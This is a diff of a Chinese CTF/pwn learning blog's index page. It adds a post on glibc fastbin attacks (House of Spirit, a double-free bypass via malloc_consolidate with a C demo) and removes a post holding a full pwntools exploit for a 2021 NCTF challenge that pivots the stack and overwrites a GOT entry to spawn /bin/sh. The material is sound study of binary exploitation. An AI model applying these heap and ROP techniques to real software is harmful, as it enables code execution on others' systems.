@@ -155,6 +155,97 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/" class="post-title-link" itemprop="url">堆利用-fastbin</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-05-03 17:47:14" itemprop="dateCreated datePublished" datetime="2022-05-03T17:47:14+08:00">2022-05-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-11 02:02:25" itemprop="dateModified" datetime="2022-05-11T02:02:25+08:00">2022-05-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学了一段时间堆之后感觉堆的知识点都太乱了，写博客都不好分类，所以就分个大概的类来写吧，这篇博客写的主要关于fast bins相关的东西</p>
+<p>主要是关于how2heap中学到的东西，感觉贴源码没有意义，所以只写个大概的总结，或者按照我的理解去写一个源码</p>
+<h3 id="关于fast-bin的保护"><a href="#关于fast-bin的保护" class="headerlink" title="关于fast bin的保护"></a>关于fast bin的保护</h3><ol>
+<li>double free：一个chunk进入fast bin时，其实是插入这个bin链表的头部，main_arena会设置一个指针直接指向这个块，同时一个chunk准备进入该bin链表时，会<strong>检查main_arena直接指向的块</strong>跟这个准备进入的块是否相同，相同则抛出double free异常。也就是说其只检查bin的链表头，不检查整个链表</li>
+<li>从fast bin中取出一个chunk时，会检查该chunk的size位是否跟这个bin链表对应的size相符，不相符则抛出异常。这个size的p位会被fast bin忽略（也就是说无所谓），但是在IS_MMAPPED跟NON_MAIN_ARENA这两种情况下会发生异常。</li>
+</ol>
+<h4 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h4><p>实验流程：让一个指针指向一个假块，将其free掉再malloc出来，实现任意地址分配。</p>
+<p>需要注意的点：① 假块的size位必须属于fast bin范围内。②假块的下一个块的size位必须被设置成一个合理的值（合理即可）。③ 假块的地址要对其。④ 假块的ISMMAP（用来判断这个chunk是否是MMAP的那一位）不能为1，因为MMAPED的块被free掉时会单独处理。</p>
+<h4 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">//防止第一个chunk被合并到top chunk</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x400</span>); <span class="comment">//触发malloc_consolidate()</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;now we malloc 1 = %p\n&quot;</span>,<span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc 2 = %p&quot;</span>,<span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>malloc_consolidate()函数主要有两个功能：</p>
+<ol>
+<li>若 fastbin 未初始化，即 global_max_fast 为 0，那就初始化 malloc_state。</li>
+<li>如果已经初始化的话，就合并 fastbin 中的 chunk。</li>
+</ol>
+<p>当我们申请一个堆块，程序遍历完unsorted bin都没有发现能满足我们需求大小的chunk时，便会执行malloc_consolidate()，将fast bin中全部能够合并的chunk进行合并，并将合并之后的大chunk放到对应的small bin或者large bin中，如果有fast bin chunk跟top chunk相邻的话那么会将这个fast bin chunk合并到top chunk里。</p>
+<p>这是执行<code>malloc(0x400);</code>之前的bins</p>
+<img src="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/fastbin_dup_consolidate-1.jpg" class>
+
+<p>当我们执行<code>malloc(0x400);</code>时，便会触发malloc_consolidate()，将fast bin中的chunk进行合并，并放到对应的small/large bin中。</p>
+<img src="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/fastbin_dup_consolidate-2.png" class>
+
+<p>可以看到此时原本的fast bin chunk被放到了small bin中，显然因为此时0x50的fast bin中已经没有chunk了，所以我们可以绕过double free的检查，再将p1 free一次</p>
+<img src="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/fastbin_dup_consolidate-3.jpg" class>
+
+<p>这样p1所对应的chunk就会同时出现在small bin和fast bin中</p>
+<img src="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/fastbin_dup_consolidate-4.jpg" class>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1257,88 +1348,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/22/ret2-libcsyscall/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/02/22/ret2-libcsyscall/" class="post-title-link" itemprop="url">ret2_libcsyscall</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-02-22 02:25:04 / 修改时间：03:03:16" itemprop="dateCreated datePublished" datetime="2022-02-22T02:25:04+08:00">2022-02-22</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>以 2.27 的 libc 版本为例，在如下函数的某处偏移中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;read + 15&gt;		syscall</span><br><span class="line">&lt;write + 18&gt;	syscall</span><br><span class="line">&lt;open64 + 76&gt;	syscall</span><br><span class="line">&lt;alarm + 5&gt;		syscall</span><br><span class="line">&lt;close + 18&gt;	syscall</span><br></pre></td></tr></table></figure>
-
-<p>这些函数的这些位置调用的就是<code>syscall</code>这个指令，如果能将某些函数的got修改为这些函数的这些位置就得到了syscall指令，而且由于 ASLR 对 libc 的随机化不会影响其最低12位（即最低3位16进制数），所以有时候当某个函数的 got 表跟其函数内部的 syscall 指令地址只有一个字节相差的时候，我们可以直接修改掉最低一字节即可，连爆破都不用。（好像都是只差一个字节）</p>
-<p>这个方法可以用在当我们需要构造 syscall 而程序中没有现存的 syscall 指令的时候。</p>
-<h3 id="2021NCTF-login"><a href="#2021NCTF-login" class="headerlink" title="2021NCTF-login"></a>2021NCTF-login</h3><p>例行保护</p>
-<img src="/2022/02/22/ret2-libcsyscall/%E2%91%A0-checksec.jpg" class>
-
-<p>程序主逻辑如下</p>
-<img src="/2022/02/22/ret2-libcsyscall/%E2%91%A0-main.png" class>
-
-<p>程序很简单，只有一个 0x10 字节长度的溢出，所以当然想到栈迁移到 .bss 段继续我们的构造。同时因为关闭了标准输出和标准错误输出，所以无法泄漏内存。</p>
-<p>那么我们自然会想到，如果无法泄漏内存的话只能我们手动makecall，那么一定会需要 syscall 指令，可惜程序中没有现存的 syscall 指令，那么我们尝试在已经调用了的函数中寻找。</p>
-<img src="/2022/02/22/ret2-libcsyscall/%E2%91%A0-libcsyscall.jpg" class>
-
-<p>可以看到在 close 函数的 +21 处就是一条 syscall 指令，而且 close 函数在 main 函数中已经调用过，所以我们可以利用 read 函数直接修改其 got 表最低一字节，由此得到一条 syscall 指令。</p>
-<p>由此我们确定思路：将栈迁移到 .bss 段，同时在上面写好我们的ROP，①需要在已知地址写入’/bin/sh‘作参数。②需要修改 close 函数的 got 表得到 syscall 指令。③ makecall调用execve。</p>
-<p>细节慢慢调即可，exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line"></span><br><span class="line">csu_addr = <span class="number">0x40128A</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">call_addr,rdi,rsi,rdx</span>):</span></span><br><span class="line">	payload = p64(<span class="number">0</span>)  <span class="comment">#rbx</span></span><br><span class="line">	payload += p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">	payload += p64(rdi) <span class="comment">#r12</span></span><br><span class="line">	payload += p64(rsi) <span class="comment">#r13</span></span><br><span class="line">	payload += p64(rdx) <span class="comment">#r14</span></span><br><span class="line">	payload += p64(call_addr) <span class="comment">#r15</span></span><br><span class="line">	payload += p64(<span class="number">0x401270</span>) <span class="comment">#ret</span></span><br><span class="line">	payload += p64(<span class="number">1</span>) <span class="comment">#padding</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line">read = <span class="number">0x4011ED</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(bss + <span class="number">0x300</span>) + p64(read)</span><br><span class="line">p.sendafter(<span class="string">&quot;Welcome to NCTF2021!&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#write to bss+0x200</span></span><br><span class="line">payload = p64(<span class="number">0x40128A</span>) + csu(elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,elf.got[<span class="string">&#x27;close&#x27;</span>],<span class="number">1</span>)</span><br><span class="line">payload += csu(elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,bss+<span class="number">0x400</span>,<span class="number">59</span>)</span><br><span class="line">payload += csu(elf.got[<span class="string">&#x27;close&#x27;</span>],bss+<span class="number">0x400</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bss+<span class="number">0x1f8</span>) + p64(<span class="number">0x40121F</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">&quot;\x85&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">59</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1404,7 +1417,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">60</span>
+          <span class="site-state-item-count">61</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
